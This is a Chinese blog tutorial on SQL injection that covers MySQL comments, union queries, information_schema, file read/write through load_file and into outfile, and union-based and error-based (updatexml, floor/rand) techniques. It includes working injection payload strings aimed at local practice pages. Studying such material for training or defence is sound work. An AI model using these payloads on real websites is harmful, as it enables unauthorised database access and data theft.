class="card-archive-list-count">8</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/09/"><span class="card-archive-list-date">九月 2021</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">19</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div><div class="console-btn-item" id="consoleKeyboard" onclick="anzhiyu.keyboardToggle()" title="快捷键开关"><a class="keyboard-switch"><i class="anzhiyufont anzhiyu-icon-keyboard"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">SQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-04-22T17:00:52.000Z" title="发表于 2024-04-23 01:00:52">2024-04-23</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-04-22T17:02:38.984Z" title="更新于 2024-04-23 01:02:38">2024-04-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">3.8k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为西安"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>西安</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="/img/default_cover.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2024/04/23/hw/SQL%E6%B3%A8%E5%85%A5/"><header><h1 id="CrawlerTitle" itemprop="name headline">SQL注入</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">渊</span><time itemprop="dateCreated datePublished" datetime="2024-04-22T17:00:52.000Z" title="发表于 2024-04-23 01:00:52">2024-04-23</time><time itemprop="dateCreated datePublished" datetime="2024-04-22T17:02:38.984Z" title="更新于 2024-04-23 01:02:38">2024-04-23</time></header><h1 id="A-SQL注入"><a href="#A-SQL注入" class="headerlink" title="A.SQL注入"></a>A.SQL注入</h1><h2 id="SQL注入危害以及本质："><a href="#SQL注入危害以及本质：" class="headerlink" title="SQL注入危害以及本质："></a>SQL注入危害以及本质：</h2><p>这些<strong>危害</strong>包括但不局限于</p>
<ol>
<li>数据库信息泄漏:数据库中存放的用户的隐私信息的泄露。</li>
<li>网页篡改:通过操作数据库对特定网页进行篡改。</li>
<li>网站被挂马，传播恶意软件:修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li>
<li>数据库被恶意操作:数据库服务器被攻击，数据库的系统管理员帐户被窜改。</li>
<li>服务器被远程控制:被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li>
<li>破坏硬盘数据，瘫痪全系统。</li>
</ol>
<p><strong>本质</strong><br>把用户输入的数据当作代码执行。<br>包含两个关键条件:<br>一:用户能够控制输入;<br>二:原本程序要执行的代码，拼接了用户输入的数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$id <span class="operator">=</span> $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$query <span class="operator">=</span> &quot;select * from information where id = &quot;.$id.&quot; limit 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>变量id的值由用户提交，在正常情况下，假如用户输入的是1，那么SQL语句会执行:</p>
<p>select * from information where id &#x3D; 1 limit 0,1</p>
<p>但是假如用户输入一段有SQL语义的语句，比如:</p>
<p>1 or 1 &#x3D;1 %23</p>
<p>那么，SQL语句在实际的执行时就会如下:</p>
<p>select*from information where id&#x3D;1or1&#x3D;1%23</p>
<p>条件一:用户能够控制变量id;条件二:原本要执行的代码，拼接了用户的输入。</p>
<p>sql注入经常出没的地方</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/sql%25E6%25B3%25A8%25E5%2585%25A5%25E7%25BB%258F%25E5%25B8%25B8%25E5%2587%25BA%25E6%25B2%25A1%25E7%259A%2584%25E5%259C%25B0%25E6%2596%25B9.png" alt="sql注入经常出没的地方"></p>
<p>简言之：一切可以与数据库进行交互的地方</p>
<h2 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h2><p>根据数据的传输方式：</p>
<p>GET类型</p>
<p>POST类型</p>
<p>COOKIE类型</p>
<p>根据数据的类型：</p>
<p>数字型</p>
<p>字符型</p>
<p>根据注入的模式：</p>
<p>基于联合查询的注入模式</p>
<p>基于报错的注入模式</p>
<p>基于布尔的盲注</p>
<p>基于时间的盲注</p>
<p>推查询的注入模式</p>
<h2 id="SQL注入的一般步骤"><a href="#SQL注入的一般步骤" class="headerlink" title="SQL注入的一般步骤"></a>SQL注入的一般步骤</h2><ol>
<li>求闭合字符</li>
<li>选择注入模式</li>
<li>爆数据库</li>
<li>爆表名</li>
<li>爆列名</li>
<li>爆字段</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E5%25AE%259E%25E4%25BE%258B.png"></p>
<h1 id="B-MySQL之SQL注入版"><a href="#B-MySQL之SQL注入版" class="headerlink" title="B.MySQL之SQL注入版"></a>B.MySQL之SQL注入版</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/MySQL.png"></p>
<h2 id="MySQL中的三种注释风格："><a href="#MySQL中的三种注释风格：" class="headerlink" title="MySQL中的三种注释风格："></a>MySQL中的三种注释风格：</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/MySQL%25E4%25B8%25AD%25E7%259A%2584%25E4%25B8%2589%25E7%25A7%258D%25E6%25B3%25A8%25E9%2587%258A%25E9%25A3%258E%25E6%25A0%25BC.png"></p>
<h2 id="MySQL中的内联注释："><a href="#MySQL中的内联注释：" class="headerlink" title="MySQL中的内联注释："></a>MySQL中的内联注释：</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E5%2586%2585%25E8%2581%2594%25E6%25B3%25A8%25E9%2587%258A.png"></p>
<p>内联注释是MySQL数据库为了保持与其他数据库兼容，特意新添加的功能。为了避免从MySQL中导出的SQL语句不能被其他数据库使用，它把一些MySQL特有的语句放在 &#x2F;*!.. *&#x2F;中，这些语句在不兼容的数据库中使用时便不会执行。而MySQL自身却能识别、执行。</p>
<p>&#x2F;*50001 *&#x2F;表示数据库版本&gt;&#x3D;5.00.01时中间的语句才会执行。</p>
<p>在SQL注入中，内联注释常用来绕过waf。</p>
<h2 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h2><ol>
<li>union 操作符用于拼接两个或者多select查询语句</li>
<li>union中的每个查询必须拥有相同的列数</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E8%2581%2594%25E5%2590%2588%25E6%259F%25A5%25E8%25AF%25A2.png"></p>
<h2 id="order-by语句"><a href="#order-by语句" class="headerlink" title="order by语句"></a>order by语句</h2><ol>
<li>ORDER BY 语句用于根据指定的列对结果集进行排序。</li>
<li>ORDER BY 语句默认按照升序对记录进行排序。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/order%2520by.png"></p>
<h2 id="information-schema的结构"><a href="#information-schema的结构" class="headerlink" title="information_schema的结构"></a>information_schema的结构</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/information.png"></p>
<blockquote>
<p>select schema_name from information_schema.schemata;</p>
<p>select table_name from information_schema.tables where table_schema&#x3D; ‘zzcms’;</p>
</blockquote>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/schema.png"  />

<blockquote>
<p>select column_name from information_schema.columns where table_schema &#x3D;zzcms’ and ‘table_name’&#x3D;’zzcms_zx’;</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/schema2.png"></p>
<h2 id="注释在SQL注入中的应用："><a href="#注释在SQL注入中的应用：" class="headerlink" title="注释在SQL注入中的应用："></a>注释在SQL注入中的应用：</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B3%25A8%25E9%2587%258A.png"></p>
<blockquote>
<p>select user from student where id &#x3D; 1 limit 0,1;<br>select user from student where id &#x3D; 1 and 1&#x3D;2 union select user() # limit 0,1;</p>
</blockquote>
<p>攻击者注入一段包含注释符的SQL语句，将原来的语句的一部分注释，注释掉的部分语句不会被执行</p>
<h2 id="SQL注入中一些常用的MySQL函数-语句："><a href="#SQL注入中一些常用的MySQL函数-语句：" class="headerlink" title="SQL注入中一些常用的MySQL函数&#x2F;语句："></a>SQL注入中一些常用的MySQL函数&#x2F;语句：</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/SQL%25E6%25B3%25A8%25E5%2585%25A5%25E4%25B8%25AD%25E5%25B8%25B8%25E7%2594%25A8%25E5%2587%25BD%25E6%2595%25B0%25E8%25AF%25AD%25E5%258F%25A5.png"></p>
<h2 id="SQL注入读写文件的根本条件："><a href="#SQL注入读写文件的根本条件：" class="headerlink" title="SQL注入读写文件的根本条件："></a>SQL注入读写文件的根本条件：</h2><ol>
<li>数据库允许导入导出(secure file_priv)</li>
<li>当前用户用户文件操作权限(File_priv)</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E8%25AF%25BB%25E5%2586%2599%25E6%25A0%25B9%25E6%259C%25AC%25E6%259D%25A1%25E4%25BB%25B6.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25A0%25B9%25E6%259C%25AC%25E6%259D%25A1%25E4%25BB%25B6.png"></p>
<p>secure_file_prive直接在my.ini文件里面设置即可</p>
<h2 id="load-file-读文件-into-outfile-into-dumpfile写文件"><a href="#load-file-读文件-into-outfile-into-dumpfile写文件" class="headerlink" title="load file()读文件        into outfile &#x2F;into dumpfile写文件"></a>load file()读文件        into outfile &#x2F;into dumpfile写文件</h2><p>条件:<br>1.对web目录具有读写权限<br>2.知道文件绝对路径<br>3.能够使用联合查询(sql注入时)</p>
<p>outfile与dumpfile的区别:<br>dumpfile适用于二进制文件，它会将目标文件写入同一行内;<br>outfile则更适用于文本文件</p>
<p>命令:</p>
<blockquote>
<p>select load_file(‘d:&#x2F;phpstudy&#x2F;www&#x2F;123.php’);</p>
<p>select ‘123’into outfile ‘d:&#x2F;phpstudy&#x2F;www&#x2F;123.php’;</p>
</blockquote>
<h2 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h2><p>concat(str1,str2..)函数直接连接</p>
<p>group_concat(str1,str2..)函数使用逗号做为分隔符</p>
<p>concat_ws(sep,str1,str2..)函数使用第一个参数做为分隔符</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E5%25AD%2597%25E7%25AC%25A6%25E4%25B8%25B2%25E8%25BF%259E%25E6%258E%25A5%25E5%2587%25BD%25E6%2595%25B0.png"></p>
<h1 id="C-SQL注入实战演练"><a href="#C-SQL注入实战演练" class="headerlink" title="C.SQL注入实战演练"></a>C.SQL注入实战演练</h1><h2 id="基于联合查询的注入模式"><a href="#基于联合查询的注入模式" class="headerlink" title="基于联合查询的注入模式"></a>基于联合查询的注入模式</h2><p>基于联合查询的注入一般步骤：</p>
<ol>
<li>求闭合字符</li>
<li>求列数</li>
<li>求显示位</li>
<li>爆数据库名</li>
<li>爆表名</li>
<li>爆列名</li>
<li>爆字段名</li>
</ol>
<p>当然，不管何种注入模式，在最开始都要先判断是否存在注入。</p>
<h2 id="判断是否存在注入与求闭合字段"><a href="#判断是否存在注入与求闭合字段" class="headerlink" title="判断是否存在注入与求闭合字段"></a>判断是否存在注入与求闭合字段</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$query <span class="operator">=</span> <span class="string">&#x27;select * from information where id = &#x27;</span>.$id.<span class="string">&#x27; limit 0,1&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>id &#x3D;1’异常</p>
<p>id&#x3D;1and 1&#x3D;1–+正确</p>
<p>id&#x3D;1and 1&#x3D;2–+错误</p>
<p>结论:极有可能存在数字型SQL注入</p>
<p>ps:单引号有个特殊的作用:命令分隔符</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$query <span class="operator">=</span> &quot;select * from information where id = &#x27;&quot;.$id.&quot;&#x27; limit 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>id &#x3D;1’异常</p>
<p>id&#x3D;1’and 1&#x3D;1–+正确</p>
<p>id&#x3D;1’and 1&#x3D;2–+错误</p>
<p>结论:极有可能存在单引号字符型SQL注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$query <span class="operator">=</span> <span class="string">&#x27;select * from information where id = &quot;&#x27;</span>.$id.<span class="string">&#x27;&quot; limit 0,1&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>id &#x3D;1”异常</p>
<p>id&#x3D;1”and 1&#x3D;1–+正确</p>
<p>id&#x3D;1”and 1&#x3D;2–+错误</p>
<p>结论:极有可能存在双引号字符型SQL注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$query <span class="operator">=</span> &quot;select * from information where id = (&quot;.$id.&quot;) limit 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>id&#x3D;1)异常</p>
<p>id&#x3D;1)and 1&#x3D;1–+正确</p>
<p>id&#x3D;1)and 1&#x3D;2–+错误</p>
<p>结论:极有可能存在括号数字型SQL注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$query <span class="operator">=</span> &quot;select * from information where username in (&#x27;&quot;.$username.&quot;&#x27;) limit 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>id &#x3D;1’异常</p>
<p>问:此时id后面加什么闭合字符页面才会正常?</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$query <span class="operator">=</span> <span class="string">&#x27;select * from information where username in (&quot;&#x27;</span>.$username.<span class="string">&#x27;&quot;) limit 0,1&quot;;</span></span><br></pre></td></tr></table></figure>

<p>id &#x3D;1’’异常</p>
<p>问:此时id后面加什么闭合字符页面才会正常?</p>
<p>求列数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E5%2588%2597%25E6%2595%25B0.png"></p>
<p>id&#x3D;1order by4–+ 正常</p>
<p>Id&#x3D;1orderby5–+ 异常</p>
<p>0rder by 表示按第几列来排序，</p>
<p>超出查询数据的列数会报错</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E5%2588%2597%25E6%2595%25B02.png"></p>
<p>有的地方会说order by判断出来的是当前表的列数。</p>
<p>很不严谨。应该说是查询了几列，按第几列来排序。</p>
<h2 id="求显示位"><a href="#求显示位" class="headerlink" title="求显示位"></a>求显示位</h2><p>求显示位的原因：</p>
<p>因为尽管查询了四列，但是却只用了两列:即只显示了两列，我们要求出到底用了哪两列，然后在所用的列上插入我们的paylaod</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E6%2598%25BE%25E7%25A4%25BA%25E4%25BD%258D.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E6%2595%25B0%25E6%258D%25AE2.png"></p>
<p>切记：要在回显的位置插入payload</p>
<h2 id="求表名"><a href="#求表名" class="headerlink" title="求表名"></a>求表名</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E8%25A1%25A8%25E5%2590%258D.png"></p>
<p>id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(table name),3,4 from information_schema.tables where table_schema&#x3D;’an’</p>
<h2 id="求列名"><a href="#求列名" class="headerlink" title="求列名"></a>求列名</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E5%2588%2597%25E5%2590%258D.png"></p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/shouke.php?id=1">http://127.0.0.1/shouke.php?id=1</a> and 1&#x3D;2 union select1,group_concat(column_name),3,4 from information_schema.columns where table_schema&#x3D;’an’ and table_name&#x3D;’admin’</p>
<h2 id="求字段内容"><a href="#求字段内容" class="headerlink" title="求字段内容"></a>求字段内容</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E5%25AD%2597%25E6%25AE%25B5%25E5%2586%2585%25E5%25AE%25B9.png"></p>
<p>shouke.php?id&#x3D;2 and 1&#x3D;2 union select1,2,group_concat(name,0x23,school),4 from an.admin – +</p>
<h2 id="基于报错的注入模式"><a href="#基于报错的注入模式" class="headerlink" title="基于报错的注入模式"></a>基于报错的注入模式</h2><p>基于报错的注入一般步骤：</p>
<ol>
<li>求闭合字符</li>
<li>爆数据库名</li>
<li>爆表名</li>
<li>爆列名</li>
<li>爆字段名</li>
</ol>
<p>Ps:页面有报错信息时优先选择基于报错的注入模式</p>
<h2 id="updatexml函数"><a href="#updatexml函数" class="headerlink" title="updatexml函数"></a>updatexml函数</h2><p>UPDATEXML (XML document, XPath string, new value);<br>第一个参数:XML document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数:XPath string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数:new value，String格式，替换查找到的符合条件的数据<br>作用:改变文档中符合条件的节点的值</p>
<p>改变XML document中符合XPATH string的值</p>
<p>而我们的注入语句为:</p>
<p>updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)<br>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出</p>
<blockquote>
<p>ERROR 1105 (HY000): XPATH syntax error:  ‘:root@localhost’</p>
</blockquote>
<h2 id="求库名"><a href="#求库名" class="headerlink" title="求库名"></a>求库名</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E5%25BA%2593%25E5%2590%258D.png"></p>
<blockquote>
<p>?id&#x3D;1’ and updatexml(1,concat(0x23,database()),1)–+</p>
</blockquote>
<h2 id="求表名-1"><a href="#求表名-1" class="headerlink" title="求表名"></a>求表名</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E8%25A1%25A8%25E5%2590%258D2.png"></p>
<blockquote>
<p>?id&#x3D;1’ and updatexml(1,concat(0x23,(select group concat(table_name) from information schema.tables where table_schema&#x3D;’security’)),1)–+</p>
</blockquote>
<h2 id="求列名-1"><a href="#求列名-1" class="headerlink" title="求列名"></a>求列名</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/%25E6%25B1%2582%25E5%2588%2597%25E5%2590%258D2.png"></p>
<blockquote>
<p>?id&#x3D;1’ and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table _schema&#x3D;’security’ and table_name&#x3D;’users’)),1)–+</p>
</blockquote>
<h2 id="Floor"><a href="#Floor" class="headerlink" title="Floor()"></a>Floor()</h2><blockquote>
<p>payload :select count(*), floor(rand(0)* 2)as a from information schema.tablesgroup by a;</p>
</blockquote>
<p>先来解释一下count(*)与group by是如何共同工作的。首先，系统会建立一个虚拟表:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/Floor.png"></p>
<p>假设有一个表</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/Floor2.png"></p>
<p>执行count(*)from .. group by age的过程中，会形成这样的虚拟表:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/Floor3.png"></p>
<p>由于groupby的是age，第一次读取的就是18，在虚拟表中寻找是否已经存在18，由于表是空的，直接插入一条新数据，这时虚拟表变成下图这样，</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/Floor4.png"></p>
<p>下一个是19，由于虚拟表中依旧没有key为19的字段，故插入。再下一个是20，继续插入。再下一个又是20。由于已经有了20，故将key为20的字段的count(*)的值加1，变为了2。剩下的以此类推，最后形成了这个虚拟表</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/Floor5.png"></p>
<p>先来回顾-下payload: select count(*)，floor(rand(0)*2)as a from information_schema.tables group by a;</p>
<p>总体是一个group by语句，只不过这里group by的是floor(rand(0)2)。这是一个表达式，每次运算的值都是随机的。floor(rand(0)2)的值序列开头是011011,ok，下面开始运算。</p>
<p>首先，建立一张虚拟表:<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/Floor6.png"></p>
<p>接着，进行group by floor(rand(0)*2)。floor表达式第一次运算的值为0,在表中没有找到key为0的数据，故插入，在插入的过程中需要再取一次group by后面的值(即再进行一次floor运算，结果为1)，取到了1，将之插入，并将count()置1。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/Floor7.png"></p>
<p>再进行group by floor(rand(0)2)。进行floor表达式运算，由于这是第三次运算了，故值为1刚好表中有了key为1的数据，故直接将其对应的count()加1即可。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Administrator/Desktop/Floor8.png"></p>
